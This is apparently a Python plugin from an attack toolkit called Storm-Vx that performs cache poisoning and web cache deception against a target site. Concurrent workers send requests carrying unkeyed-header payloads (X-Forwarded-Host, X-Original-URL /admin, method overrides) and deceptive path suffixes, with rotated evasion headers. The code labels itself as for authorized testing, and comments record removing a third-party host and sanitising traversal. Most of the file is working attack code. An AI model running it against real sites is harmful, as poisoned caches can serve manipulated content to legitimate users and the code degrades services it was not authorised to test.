#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_cache_poison — Cache Poisoning Attack Plugin

Sends requests with deceptive headers to poison CDN/reverse proxy
caches. Uses unkeyed headers (like X-Forwarded-Host, X-Forwarded-Proto)
to manipulate cached responses. This can force the CDN to serve
malicious content to legitimate users.
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any
from urllib.parse import urlparse

import aiohttp


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str, rand_cache_bust
from vf_validator import sanitize_path


__all__ = ["CachePoisonPlugin"]


# ─── Poisoning Techniques ────────────────────────────────────────────────────

# SEC-H3 FIX: Static headers with hardcoded "evil.example.com" removed.
# Host/X-Forwarded-Host headers now use the TARGET domain dynamically
# (see _build_poison_headers below). Only target-domain headers are generated.

# Static poison headers (safe — no domain-specific values)
_STATIC_POISON_HEADERS = [
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Scheme": "https"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-HTTP-Method-Override": "PUT"},
    {"X-Method-Override": "PATCH"},
    {"Range": "bytes=0-1"},
]


def _build_poison_headers(target_domain: str) -> list:
    """Build poison headers list with target-domain Host/Forwarded-Host.

    SEC-H3 fix: Replaces hardcoded "evil.example.com" with the actual
    target domain. Host header attacks against non-target domains are
    out of scope and risk collateral damage to third parties.

    Args:
        target_domain: The hostname extracted from the target URL.

    Returns:
        List of header dicts for cache poisoning tests.
    """
    headers = list(_STATIC_POISON_HEADERS)
    # Domain-dependent headers — use TARGET domain, not arbitrary third-party
    headers.append({"X-Forwarded-Host": target_domain})
    headers.append({"Host": target_domain})
    return headers


class CachePoisonPlugin(AttackPlugin):
    """Cache Poisoning — manipulate CDN cache with deceptive headers.

    Sends requests with unkeyed headers that CDNs/reverse proxies
    might not include in their cache key. If the origin server
    reflects these headers in the response, the cached version
    can be "poisoned" to serve manipulated content.

    Also tests Web Cache Deception (WCD) by appending path
    extensions like /.css, /.js, /%0a, etc.
    """

    meta = PluginMeta(
        name='cache_poison',
        version='1.0.0',
        plugin_type='attack',
        description='Cache poisoning — deceptive headers to poison CDN/reverse proxy caches',
        tags=['http', 'cache', 'cdn', 'poisoning', 'wcd'],
        priority=44,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    # Web Cache Deception path suffixes
    WCD_SUFFIXES = [
        "/.css", "/.js", "/.png", "/.ico", "/.svg",
        "/%0a", "/%0d", "/..%2f", "/%23",
        "/?", "/;/", "/~/.css",
    ]

    def _build_poisoned_request(self, context: AttackContext) -> tuple:
        """Build a request with poisoning headers or WCD path.

        Returns:
            (url, headers, technique_name)
        """
        pages = context.page_targets or [context.url]
        base_url = random.choice(pages)
        technique = random.choice(["header_poison", "wcd", "combo"])

        # BUG-007: Use fresh evasion-rotated headers instead of static context.headers
        headers = self._get_fresh_headers(context, "document")

        # SEC-H3: Extract target domain for Host/X-Forwarded-Host headers
        target_domain = urlparse(context.url).netloc.split(':')[0] if context.url else "localhost"
        poison_headers = _build_poison_headers(target_domain)

        if technique == "header_poison":
            # Add random poison headers
            poison = random.choice(poison_headers)
            headers.update(poison)
            url = base_url
            if random.random() > 0.5:
                url += f"{'&' if '?' in url else '?'}{rand_cache_bust()}"
            return url, headers, "HDR-POISON"

        elif technique == "wcd":
            # Web Cache Deception: add path extension
            suffix = random.choice(self.WCD_SUFFIXES)
            # BUG-24 FIX: Sanitize WCD suffix to remove traversal sequences
            # (e.g., "/..%2f" contains encoded "../" which sanitize_path strips)
            sanitized_suffix = sanitize_path(suffix)
            url = base_url.rstrip('/') + sanitized_suffix
            return url, headers, "WCD"

        else:  # combo
            # Combine header poisoning + WCD path
            poison = random.choice(poison_headers)
            headers.update(poison)
            suffix = random.choice(self.WCD_SUFFIXES[:6])  # Shorter list for combo
            # BUG-24 FIX: Sanitize WCD suffix here too
            sanitized_suffix = sanitize_path(suffix)
            url = base_url.rstrip('/') + sanitized_suffix
            return url, headers, "COMBO"

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Cache poison worker: send requests with deceptive headers/paths."""
        _ssl = context.ssl_param

        delay_ms = context.extra.delay_ms

        while not self._stop_event.is_set():
            try:
                url, headers, technique = self._build_poisoned_request(context)

                t = time.monotonic()
                try:
                    async with context.session.get(url, headers=headers,
                                                   ssl=_ssl, allow_redirects=False) as resp:
                        rt = time.monotonic() - t
                        ok = resp.status < 500
                        await self._record(technique, ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    await self._record(technique, False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                await self._record("CACHE", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)

